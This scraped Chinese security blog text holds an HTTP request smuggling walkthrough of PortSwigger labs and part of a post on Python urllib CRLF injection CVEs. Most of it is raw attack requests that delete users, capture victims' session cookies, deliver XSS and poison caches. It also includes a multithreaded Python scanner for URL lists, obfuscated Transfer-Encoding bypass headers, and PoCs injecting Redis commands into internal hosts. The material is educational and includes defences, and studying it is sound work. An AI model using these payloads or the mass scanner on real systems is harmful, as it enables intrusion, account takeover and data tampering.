x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-clConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 4Transfer-Encoding: chunked3dGET /admin/delete?username=carlos HTTP/1.1Host: localhost0 获取前端服务器重写请求字段 在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段是后端服务器对请求进行处理所必须的，比如： 描述TLS连接所使用的协议和密码 包含用户IP地址的XFF头 用户的会话令牌ID 总之，如果不能获取到代理服务器添加或者重写的字段，我们走私过去的请求就不能被后端服务器进行正确的处理。那么我们该如何获取这些值呢。PortSwigger提供了一个很简单的方法，主要是三大步骤： 找一个能够将请求参数的值输出到响应中的POST请求 把该POST请求中，找到的这个特殊的参数放在消息的最后面 然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。 Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting 题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。/admin上有一个管理面板，但只有IP地址为127.0.0.1的用户才能访问。前端服务器将HTTP标头添加到包含其IP地址的传入请求中。它类似于X-Forwarded-For标头，但名称不同。要解决此问题，请向后端服务器走私一个请求，以显示前端服务器添加的标头。然后将包含添加的标头的请求走私到后端服务器，访问管理面板，并删除用户carlos。 我们像之前一样发包尝试通过Host头设置127.0.0.1来访问/admin，发现行不通： 那就是说，后端服务器不是通过Host头而是通过其他可能是前端服务器添加的头来解析得到IP地址的。 此时，我们需要先找一个能够将请求参数的值输出到响应中的POST请求，这里找到了网页的搜索功能： 首先我们找一个能够将请求参数的值输出到响应中的POST请求，这里找到了网页的搜索功能： 其中该请求报文如下，直接POST方式带上search参数访问/即可： 接着构造如下报文： 12345678910111213141516171819POST / HTTP/1.1Host: ac991ff31ee2ddda80ad48c000dd0065.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewritingConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 78Transfer-Encoding: chunked0POST / HTTP/1.1Content-Length: 100Connection: closesearch=mi1k7ea 其中CL值为100，而后面数据的长度是不够100的，因此后端服务器在接收到这个走私请求之后会认为这个请求还没传输完毕，继续等待传输。接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达100时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这样一来，后来的请求的一部分被作为了走私的请求的参数的一部分，然后从响应中表示了出来，我们就能获取到了前端服务器重写的字段。 发送几次看到Search结果处返回了包含X-NntHAY-Ip头，它的值为IP地址： 将之前CL.TE的构造报文的头改下就ok了： 12345678910111213141516POST / HTTP/1.1Host: ac991ff31ee2ddda80ad48c000dd0065.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewritingConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 52Transfer-Encoding: chunked0GET /admin HTTP/1.1X-NntHAY-Ip: 127.0.0.1 多发送几次就能成功访问到/admin页面： 最后就是构造删除carlos用户的报文了： 12345678910111213141516POST / HTTP/1.1Host: ac991ff31ee2ddda80ad48c000dd0065.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewritingConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 75Transfer-Encoding: chunked0GET /admin/delete?username=carlos HTTP/1.1X-NntHAY-Ip: 127.0.0.1 多发送几次即可： 获取其他用户的请求 在上一个实验中，我们通过走私一个不完整的请求来获取前端服务器添加的字段，而字段来自于我们后续发送的请求。换句话说，我们通过请求走私获取到了我们走私请求之后的请求。如果在我们的恶意请求之后，其他用户也进行了请求呢？我们寻找的这个POST请求会将获得的数据存储并展示出来呢？这样一来，我们可以走私一个恶意请求，将其他用户的请求的信息拼接到走私请求之后，并存储到网站中，我们再查看这些数据，就能获取用户的请求了。这可以用来偷取用户的敏感信息，比如账号密码等信息。 Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests 题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。为了解决实验室问题，请将请求走私到后端服务器，该请求将下一个用户的请求存储在应用程序中。然后检索下一个用户的请求，并使用受害用户的cookie来访问其帐户。 首先我们需要找到保存用户POST参数的页面，这里我们随便点击一篇博文查看，在提交评论的时候可以在文章评论一栏中保存我们POST的内容： 对应如下接口： 构造如下请求报文： 123456789101112131415161718192021POST / HTTP/1.1Host: ac0b1fda1f41126280f9132f0097008c.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: https://ac0b1fda1f41126280f9132f0097008c.web-security-academy.net/post/comment/confirmation?postId=2Connection: closeCookie: session=JCjJgAksKxZgUSaXS9u7FJc8FqsuaNDtUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 270Transfer-Encoding: chunked0POST /post/comment HTTP/1.1Host: ac661f531e07f12180eb2f1a009d0092.web-security-academy.netCookie: session=JCjJgAksKxZgUSaXS9u7FJc8FqsuaNDtContent-Length: 400csrf=za3lvdP3pkuZE53Npssm5z7LN48uUQoR&amp;postId=2&amp;name=mi1k7ea&amp;email=email%40qq.com&amp;website=&amp;comment= 其中CL值为400，而后面数据的长度是不够400的，因此后端服务器在接收到这个走私请求之后会认为这个请求还没传输完毕，继续等待传输。接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达400时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这样一来，后来的请求的一部分被作为了走私的请求的参数comment的一部分，然后在指定的博文的评论中返回显示出来。 多请求几次，然后到该博文中查看评论就看到包括其他用户请求的信息（这里是User-Agent不同来辨别的）： 组合反射型XSS当HRS与反射型XSS组合利用时，就不再需要用户的交互来触发XSS了。 Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss 题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。该应用程序在User-Agent头处存在反射型XSS。 为了解决实验室问题，请将请求走私到后端服务器，该请求导致下一个用户的请求接收到包含执行alert(1)的XSS漏洞的响应。 首先我们找下存在反射型XSS的页面，根据提示是User-Agent注入的XSS，而我们在查看具体文章的时候确实是找到了这个接口存在User-Agent的反射型XSS： 为了让这个反射型XSS的利用更多深入，我们结合HRS，这样无需用户交互就能触发XSS。构造如下请求报文： 12345678910111213141516POST / HTTP/1.1Host: ac131fc91e3b433b80100743007900e8.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xssConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 74Transfer-Encoding: chunked0GET /post?postId=4 HTTP/1.1User-Agent: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;# 发送几次： 然后刷新界面就会触发XSS弹框： 组合Web缓存投毒攻击 一般来说，前端服务器出于性能原因，会对后端服务器的一些资源进行缓存，如果存在HTTP请求走私漏洞，则有可能使用重定向来进行缓存投毒，从而影响后续访问的所有用户。 Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning 题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。前端服务器配置为缓存某些响应。为了解决此问题，请执行请求走私攻击，使缓存中毒，以便随后对JavaScript文件的请求将重定向到漏洞利用服务器。中毒的缓存应alert(document.cookie)。 实验环境提供了漏洞利用的辅助服务器，这里我们编辑响应的报文如下，为了方便看效果先将alert(document.cookie)改为alert(1)： 构造如下POST请求走私报文，这里可以通过HRS攻击使得该网站的下一个请求重定向到漏洞利用服务器上的/post接口，而我们知道该接口响应返回的是前面设置的alert(1)内容： 123456789101112131415161718POST / HTTP/1.1Host: aceb1fb41f8e127580ac37b400560067.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoningConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 178Transfer-Encoding: chunked0GET /post/next?postId=1 HTTP/1.1Host: ac521f121f4e12738066379201d30067.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 10 接着重放访问其中随意一个js文件的报文，这里选择/resources/js/tracking.js，当上一个HRS攻击报文发送后，由其中”GET /post/next?postId=1 HTTP/1.1”之后的内容将会和当前的访问/resources/js/tracking.js的报文拼接起来，而此时合并的报文实际是访问漏洞利用服务器的js文件即响应返回“alert(1)”，此时缓存的/resources/js/tracking.js文件的内容实际上就被投毒攻击为“alert(1)”： 12345678GET /resources/js/tracking.js HTTP/1.1Host: aceb1fb41f8e127580ac37b400560067.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: https://aceb1fb41f8e127580ac37b400560067.web-security-academy.net/Connection: closeCookie: session=mOFHLW0BPPkUKB4V858oSPuy3rTh9eUn 上面POST和GET报文交替发送多次，然后点击第一篇博文查看，可以看到响应为缓存的漏洞利用服务器上的js文件： 此时再访问主页，成功弹框，即缓存投毒攻击成功： 0x05 BurpSuite的HRS扫描原理简单地说，BurpSuite是通过构造特定的数据包让后端服务器阻塞，通过超时机制来进行HRS漏洞检测的。 CL.TE型HRS扫描原理针对CL.TE型HRS，BurpSuite发送以下报文进行检测： 12345678POST / HTTP/1.1Host: ceshi.domain.comTransfer-Encoding: chunkedContent-Length: 41ZQ 如果前端服务器是使用CL解析，那么根据数据包中的Content-Length: 4，前台服务器只会转发这个部分： 121\\r\\nZ 而后端服务器使用TE解析，由于前端服务器转发过了的body中并未有0\\r\\n\\r\\n，因此后端服务器会一直等待下一个chunked块的大小值，但由于没有因此会造成约为10s的超时。 但是当数据包中的Content-Length: 11时，因为Q是一个无效的块大小值（chunked块大小值用十六进制表示，Q不能表示十六进制数），所以后端服务器中该请求结束，不会产生超时，双换行是因为部分系统没有换行会进行等待，原因未知： 12345678POST / HTTP/1.1Host: ceshi.domain.comTransfer-Encoding: chunkedContent-Length: 111ZQ 如果服务端是TE.CL类型，则由于无效的块大小“Q”，前端服务器就已经拒绝该请求而不会转发到后端服务器中。这样可以防止后端服务器Socket中毒。 代码实现如下，先判断CL为4时是否超时，若超时且CL为11时不超时，如果CL为4的响应时间大于5s且CL为4的请求响应时间远大于CL为11的响应时间，即可认为存在CL.TE型HRS漏洞： 12345678910111213141516171819202122232425262728def check_CLTE(self): n = 0 payloads = self.payload_headers if self.headers_payload == [] else self.headers_payload for headers in payloads: n = n + 1 headers['Content-Length'] = 4 payload = \"1\\r\\nZ\\r\\nQ\\r\\n\\r\\n\\r\\n\" print(self.url, headers) t2 = self.detect_CLTE(headers, payload) if t2 == None: t2 = 0 if t2 &lt; 5: continue headers['Content-Length'] = 11 print(self.url, headers) payload = \"1\\r\\nZ\\r\\nQ\\r\\n\\r\\n\\r\\n\" t1 = self.detect_CLTE(headers, payload) if t1 == None: t1 = 1 print (t1, t2) if t2 &gt; 5 and t2 / t1 &gt;= 5: self.valid = True self.type = \"CL-TE\" self.headers_payload = [headers] return True return False TE.CL型HRS扫描原理针对TE.CL型HRS，BurpSuite发送以下报文进行检测： 123456789POST / HTTP/1.1Host: ceshi.domain.comContent-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding : chunked0X 因为前端服务器使用TE解析，0\\r\\n\\r\\n代表chunked结束，所以后端服务器只会收到如下部分： 120\\r\\n\\r\\n 而由于后端服务器使用CL解析，解析Content-Length: 6便会尝试获取请求报文中的6字节内容，而0\\r\\n\\r\\n只有5个字节，后端服务器会等待第6个字节直至超时。 如果服务端是CL.TE类型，则此检测方法将使X毒化后端服务器的请求，从而可能损害合法用户。但是我们可以通过先执行CL.TE类HRS的检测再执行TE.CL类HRS的检测来避免这个问题。 代码实现如下，通过判断CL为6超时、CL为5不超时来确定是存在TE.CL型HRS漏洞： 12345678910111213141516171819202122232425262728def check_TECL(self): n = 0 payloads = self.payload_headers if self.headers_payload == [] else self.headers_payload for headers in payloads: n = n + 1 payload = \"0\\r\\n\\r\\nX\" headers['Content-Length'] = 6 print(self.url, headers) t2 = self.detect_TECL(headers, payload) if t2 == None: t2 = 0 if t2 &lt; 5: continue print(self.url, headers) payload = \"0\\r\\n\\r\\n\" headers['Content-Length'] = 5 t1 = self.detect_TECL(headers, payload) if t1 == None: t1 = 1 if t2 == None: t2 = 0 # print (t1, t2) if t2 &gt; 5 and t2 / t1 &gt;= 5: self.valid = True self.type = \"TE-CL\" self.headers_payload = [headers] return True return False 网上参考的脚本基于上面的基础，脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226#!/usr/bin/python3'''Author: xphCreateTime: 2019-09-18'''from requests import Request, Sessionfrom requests.exceptions import ReadTimeoutimport urllib3import requestsimport collectionsimport http.clienthttp.client._is_legal_header_name = lambda x: Truehttp.client._is_illegal_header_value = lambda x: Falseurllib3.disable_warnings()fp = open(\"res.txt\", 'a')fp.write(\"\\n\" + \"-\" * 50 + \"\\n\")fp.flush()class HTTP_REQUEST_SMUGGLER(): def __init__(self, url): self.headers_payload = [] self.valid = False self.type = \"\" self.url = url self.Transfer_Encoding1 = [[\"Transfer-Encoding\", \"chunked\"], [\"Transfer-Encoding \", \"chunked\"], [\"Transfer_Encoding\", \"chunked\"], [\"Transfer Encoding\", \"chunked\"], [\" Transfer-Encoding\", \"chunked\"], [\"Transfer-Encoding\", \" chunked\"], [\"Transfer-Encoding\", \"chunked\"], [\"Transfer-Encoding\", \"\\tchunked\"], [\"Transfer-Encoding\", \"\\u000Bchunked\"], [\"Content-Encoding\", \" chunked\"], [\"Transfer-Encoding\", \"\\n chunked\"], [\"Transfer-Encoding\\n \", \" chunked\"], [\"Transfer-Encoding\", \" \\\"chunked\\\"\"], [\"Transfer-Encoding\", \" 'chunked'\"], [\"Transfer-Encoding\", \" \\n\\u000Bchunked\"], [\"Transfer-Encoding\", \" \\n\\tchunked\"], [\"Transfer-Encoding\", \" chunked, cow\"], [\"Transfer-Encoding\", \" cow, \"], [\"Transfer-Encoding\", \" chunked\\r\\nTransfer-encoding: cow\"], [\"Transfer-Encoding\", \" chunk\"], [\"Transfer-Encoding\", \" cHuNkeD\"], [\"TrAnSFer-EnCODinG\", \" cHuNkeD\"], [\"Transfer-Encoding\", \" CHUNKED\"], [\"TRANSFER-ENCODING\", \" CHUNKED\"], [\"Transfer-Encoding\", \" chunked\\r\"], [\"Transfer-Encoding\", \" chunked\\t\"], [\"Transfer-Encoding\", \" cow\\r\\nTransfer-Encoding: chunked\"], [\"Transfer-Encoding\", \" cow\\r\\nTransfer-Encoding: chunked\"], [\"Transfer\\r-Encoding\", \" chunked\"], [\"barn\\n\\nTransfer-Encoding\", \" chunked\"], ] self.Transfer_Encoding = list(self.Transfer_Encoding1) for x in self.Transfer_Encoding1: if \" \" == x[1][0]: for i in [9, 11, 12, 13]: # print (type(chr(i))) c = str(chr(i)) self.Transfer_Encoding.append([x[0], c + x[1][1:]]) self.payload_headers = [] self.n1 = 1 for x in self.Transfer_Encoding: headers = collections.OrderedDict() headers[x[0]] = x[1] headers['Cache-Control'] = \"no-cache\" headers['Content-Type'] = \"application/x-www-form-urlencoded\" headers['User-Agent'] = \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\" self.payload_headers.append(headers) self.n1 = self.n1 + 1 def detect_CLTE(self, headers=&#123;&#125;, payload=\"\"): s = Session() req = Request('POST', self.url, data=payload) prepped = req.prepare() prepped.headers = headers resp_time = 0 try: resp = s.send(prepped, verify=False, timeout=10) resp_time = resp.elapsed.total_seconds() return resp_time except Exception as e: print (e) resp_time = 10 if isinstance(e, ReadTimeout): print(\"requests.exceptions.ReadTimeout\") return resp_time def detect_TECL(self, headers=&#123;&#125;, payload=\"\"): s = Session() req = Request('POST', self.url, data=payload) prepped = req.prepare() prepped.headers = headers resp_time = 0 try: resp = s.send(prepped, verify=False, timeout=10) resp_time = resp.elapsed.total_seconds() print(resp, resp_time) except Exception as e: print (e) if isinstance(e, ReadTimeout): resp_time = 10 print(\"requests.exceptions.ReadTimeout\") # print(resp_time) return resp_time def check_CLTE(self): n = 0 payloads = self.payload_headers if self.headers_payload == [] else self.headers_payload for headers in payloads: n = n + 1 headers['Content-Length'] = 4 payload = \"1\\r\\nZ\\r\\nQ\\r\\n\\r\\n\\r\\n\" print(self.url, headers) t2 = self.detect_CLTE(headers, payload) if t2 == None: t2 = 0 if t2 &lt; 5: continue headers['Content-Length'] = 11 print(self.url, headers) payload = \"1\\r\\nZ\\r\\nQ\\r\\n\\r\\n\\r\\n\" t1 = self.detect_CLTE(headers, payload) if t1 == None: t1 = 1 print (t1, t2) if t2 &gt; 5 and t2 / t1 &gt;= 5: self.valid = True self.type = \"CL-TE\" self.headers_payload = [headers] return True return False def check_TECL(self): n = 0 payloads = self.payload_headers if self.headers_payload == [] else self.headers_payload for headers in payloads: n = n + 1 payload = \"0\\r\\n\\r\\nX\" headers['Content-Length'] = 6 print(self.url, headers) t2 = self.detect_TECL(headers, payload) if t2 == None: t2 = 0 if t2 &lt; 5: continue print(self.url, headers) payload = \"0\\r\\n\\r\\n\" headers['Content-Length'] = 5 t1 = self.detect_TECL(headers, payload) if t1 == None: t1 = 1 if t2 == None: t2 = 0 # print (t1, t2) if t2 &gt; 5 and t2 / t1 &gt;= 5: self.valid = True self.type = \"TE-CL\" self.headers_payload = [headers] return True return False def run(self): try: h = &#123; \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\"&#125; requests.get(self.url, headers=h, verify=False, timeout=10) if not self.check_CLTE(): self.check_TECL() except Exception as e: print(e) print(\"timeout: \" + self.url) return self.recheck() def recheck(self): print(\"recheck\") print(self.valid, self.type) if self.valid: if self.type == \"CL-TE\": if self.check_CLTE(): print (\"Find CL-TE: \" + self.url) payload_key = list(self.headers_payload[0])[0] payload_value = self.headers_payload[0][payload_key] payload = str([payload_key, payload_value]) print(payload) fp.write(\"CL-TE\\t poc:\" + payload + \"\\t\" + self.url + \"\\n\") fp.flush() return [\"CL-TE\", payload] else: if self.check_TECL(): print (\"Find TE-CL: \" + self.url) payload_key = list(self.headers_payload[0])[0] payload_value = self.headers_payload[0][payload_key] payload = str([payload_key, payload_value]) print(payload) fp.write(\"TE-CL\\t poc:\" + payload + \"\\t\" + self.url + \"\\n\") fp.flush() return [\"TE-Cl\", payload]def func(url): a = HTTP_REQUEST_SMUGGLER(url) print(a.run())def main(): import threadpool iter_list = open(\"urls.txt\").read().split(\"\\n\") pool = threadpool.ThreadPool(30) thread_requests = threadpool.makeRequests(func, iter_list) [pool.putRequest(req) for req in thread_requests] pool.wait()func(\"https://example.com\") 0x06 Bypass技巧混淆TE头前面提到了一些混淆TE头的方法如下： 123456789101112131415Transfer-Encoding: xchunkedTransfer-Encoding : chunkedTransfer-Encoding: chunkedTransfer-Encoding: xTransfer-Encoding:[tab]chunked[space]Transfer-Encoding: chunkedX: X[\\n]Transfer-Encoding: chunkedTransfer-Encoding: chunked 除此之外，更多的一些混淆方法如下： 123456789101112131415161718192021222324252627282930Transfer-Encoding:chunkedTransfer-Encoding :chunkedTransfer_Encoding:chunkedTransfer Encoding:chunked Transfer-Encoding:chunkedTransfer-Encoding: chunkedTransfer-Encoding:chunkedTransfer-Encoding:\\tchunkedTransfer-Encoding:\\u000BchunkedContent-Encoding: chunkedTransfer-Encoding:\\n chunkedTransfer-Encoding\\n : chunkedTransfer-Encoding: \\&quot;chunked\\&quot;Transfer-Encoding: &apos;chunked&apos;Transfer-Encoding: \\n\\u000BchunkedTransfer-Encoding: \\n\\tchunkedTransfer-Encoding: chunked, cowTransfer-Encoding: cow, Transfer-Encoding: chunked\\r\\nTransfer-encoding: cowTransfer-Encoding: chunkTransfer-Encoding: cHuNkeDTrAnSFer-EnCODinG: cHuNkeDTransfer-Encoding: CHUNKEDTRANSFER-ENCODING: CHUNKEDTransfer-Encoding: chunked\\rTransfer-Encoding: chunked\\tTransfer-Encoding: cow\\r\\nTransfer-Encoding: chunkedTransfer-Encoding: cow\\r\\nTransfer-Encoding: chunkedTransfer\\r-Encoding: chunkedbarn\\n\\nTransfer-Encoding: chunked 设置X-Forwarded-Proto以解决无法HTTP发送的问题原payload： 1GET / HTTP/1.1Host: staging-alerts.newrelic.comHTTP/1.1 301 Moved PermanentlyLocation: https://staging-alerts.newrelic.com/ 修改后： 1GET / HTTP/1.1Host: staging-alerts.newrelic.comX-Forwarded-Proto: httpsHTTP/1.1 404 Not FoundAction Controller: Exception caught 设置X-nr-external-service授权标头原payload： 1GET /revision_check HTTP/1.1Host: staging-alerts.newrelic.comX-Forwarded-Proto: httpsHTTP/1.1 200 OKNot authorized with header: 修改后： 1...GET /revision_check HTTP/1.1Host: staging-alerts.newrelic.comX-Forwarded-Proto: httpsX-nr-external-service: 1HTTP/1.1 403 ForbiddenForbidden 0x07 防御方法 使用HTTP2.0协议，其本身会对请求进行隔离，不存在HRS问题； 禁止前端服务器与后端服务器之间的TCP连接重用，保证不同用户不会复用同一个TCP连接； 前后端使用相同的服务器； 后端服务器需要对所有的请求字段做严格的校验，尤其是需要对备注类的头字段； 后端服务器需要针对敏感页面开启CSP；","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"HRS","slug":"HRS","permalink":"https://www.mi1k7ea.com/tags/HRS/"}]},{"title":"Python urllib CRLF注入漏洞小结","date":"2020-03-09T15:05:41.000Z","path":"2020/03/09/Python-urllib-CRLF注入漏洞小结/","text":"0x00 前言Python urllib CRLF注入漏洞是很早的东西了，但是19年又新爆出两个CVE，这里就比较下这几个CVE利用注意点及区别吧。 0x01 CRLF注入漏洞CRLF是“回车 + 换行”（\\r\\n）的简称，十六进制，码为0x0d和0x0a。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。因此，当我们能够控制HTTP消息头中的字符，注入一些恶意的换行比如一些会话Cookie或者HTML代码，这就是CRLF注入。 具体的可看到wooyun之前的文章：https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html 0x02 CVE-2016-5699影响版本urllib2 and urllib in CPython (aka Python) before 2.7.10 and 3.x before 3.4.4 特征正常访问URL： http://10.10.10.10:8080 CRLF注入，注入点在IP地址和端口号的分隔符即:前面： http://10.10.10.10\\r\\nx-injected: header\\r\\ntest:8080 PoC这部分直接引自参考的文章。 HTTP协议解析host的时候可以接受百分号编码的值，解码，然后包含在HTTP数据流里面，但是没有进一步的验证或者编码，这就可以注入一个换行符。 漏洞验证代码如下，fetch3.py： 1234567891011121314#!/usr/bin/env python3import sysimport urllibimport urllib.errorimport urllib.requesturl = sys.argv[1]try: info = urllib.request.urlopen(url).info() print(info)except urllib.error.URLError as e: print(e) 本地开启nc监听端口： 1nc -l -p 12345 接着，正常运行访问： 1./fetch3.py http://127.0.0.1:12345/foo 在nc中会接收到如下报文： 12345GET /foo HTTP/1.1Accept-Encoding: identityUser-Agent: Python-urllib/3.4Connection: closeHost: 127.0.0.1:12345 现在，我们在IP地址和端口之间的分隔符即:之前进行CRLF注入，尝试注入两个HTTP头字段： 1./fetch3.py http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo 然后在nc中接收到如下报文： 1234567GET /foo HTTP/1.1Accept-Encoding: identityUser-Agent: Python-urllib/3.4Host: 127.0.0.1X-injected: headerx-leftover: :12345Connection: close 可以看到，请求是正常发送的，并且在Host头字段处获取主机IP地址时成功进行了CRLF注入，即将X-injected和x-leftover这两个头字段都注入了进去。至此，攻击者就可以注入任意的HTTP头字段了。 另外，在针对的是域名而非IP地址的场景进行利用的时候有个注意点，就是在域名后进行CRLF注入之前要插入一个空字符如%00，这样才能顺利地进行DNS查询。 比如下面的CRLF注入会URL解析失败： 1http://localhost%0d%0ax-bar:%20:12345/foo 但是下面的URL是可以正常解析并访问到127.0.0.1的： 1http://localhost%00%0d%0ax-bar:%20:12345/foo 源码分析参考这篇文章即可：[CVE-2016-5699] Python HTTP header injection in urllib/urllib2 0x03 CVE-2019-9740影响版本urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3 特征正常访问URL： http://10.10.10.10:8080/test/?test=a CRLF注入，注入点在IP地址和端口号的分隔符即:前面，但是和前者的区别在于注入新的端口： http://10.10.10.10:1234?a=1 HTTP/1.1\\r\\nX-injected: header\\r\\nTEST: 123:8080/test/?test=a PoC官网的PoC： 123456789101112131415#!/usr/bin/env python3import sysimport urllibimport urllib.errorimport urllib.requesthost = \"192.168.10.137:7777?a=1 HTTP/1.1\\r\\nX-injected: header\\r\\nTEST: 123\"url = \"http://\" + host + \":8080/test/?test=a\"try: info = urllib.request.urlopen(url).info() print(info)except urllib.error.URLError as e: print(e) 在Kali开启nc监听7777端口： 1nc -lvp 7777 然后运行PoC脚本后，在Kali端接收到请求，可以看到请求报文中是成功CRLF注入了HTTP头字段的： 接着，我们试下攻击Redis，修改PoC脚本如下： 123456789101112131415#!/usr/bin/env python3import sysimport urllibimport urllib.errorimport urllib.requesthost = \"192.168.10.137:6379?\\r\\nSET hacker mi1k7ea\\r\\n\"url = \"http://\" + host + \":8080/test/?test=a\"try: info = urllib.request.urlopen(url).info() print(info)except urllib.error.URLError as e: print(e) 运行脚本，显示报错： 虽然报错，但是在Kali中的Redis中成功创建了新的键值数据，也就是说成功通过Python urllib CRLF注入实现攻击Redis： 源码分析参考这篇文章即可：CVE-2019-9740 Python urllib CRLF injection vulnerability 浅析 0x04 CVE-2019-9947影响版本urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3 特征正常访问URL： http://10.10.10.10:8080 CRLF注入，注入点在端口号后面： http://10.10.10.10:8080/?q=HTTP/1.1\\r\\nHeader: Value\\r\\nHeader2: \\r\\n http://10.10.10.10:8080/HTTP/1.1\\r\\nHeader: Value\\r\\nHeader2: \\r\\n PoC官网的PoC： 12345import urllib.requesturllib.request.urlopen('http://192.168.10.137:7777/?q=HTTP/1.1\\r\\nHeader: Value\\r\\nHeader2: \\r\\n')# 或者#urllib.request.urlopen('http://192.168.10.137:7777/HTTP/1.1\\r\\nHeader: Value\\r\\nHeader2: \\r\\n') 在Kali开启nc监听7777端口： 1nc -lvp 7777 然后运行PoC脚本后，在Kali端接收到请求，可以看到两种形式的请求报文中都是成功CRLF注入了HTTP头字段的： 接着修改下PoC脚本来打内网Redis： 123import urllib.requesturllib.request.urlopen('http://192.168.10.137:6379/?q=HTTP/1.1\\r\\nSET VULN POC\\r\\nHeader2:\\r\\n') 